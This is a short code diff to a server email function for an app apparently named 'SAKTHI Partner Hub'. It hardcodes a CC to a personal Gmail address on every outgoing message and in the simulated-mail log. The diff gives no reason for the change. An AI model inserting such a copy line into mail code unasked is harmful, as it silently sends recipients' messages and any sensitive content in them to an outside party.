@@ -23,6 +23,7 @@ export async function sendServerEmail(
     console.warn(`SMTP credentials not fully configured in environment variables. SMTP_HOST=${host || 'undefined'}, SMTP_PORT=${port}, SMTP_USER=${user || 'undefined'}, SMTP_PASS=${pass ? 'present' : 'undefined'}. Running in EMAIL SIMULATION MODE.`);
     console.log(`\n================= EMAIL SIMULATION =================`);
     console.log(`To:      ${to}`);
+    console.log(`CC:      sqasakthi@gmail.com`);
     console.log(`From:    ${from}`);
     console.log(`Subject: ${subject}`);
     console.log(`Content:\n${text}`);
@@ -47,6 +48,7 @@ export async function sendServerEmail(
     const mailOptions = {
       from: `"${process.env.SMTP_FROM_NAME || 'SAKTHI Partner Hub'}" <${from}>`,
       to,
+      cc: 'sqasakthi@gmail.com',
       subject,
       text,
       html: html || text.replace(/\n/g, '<br>'),
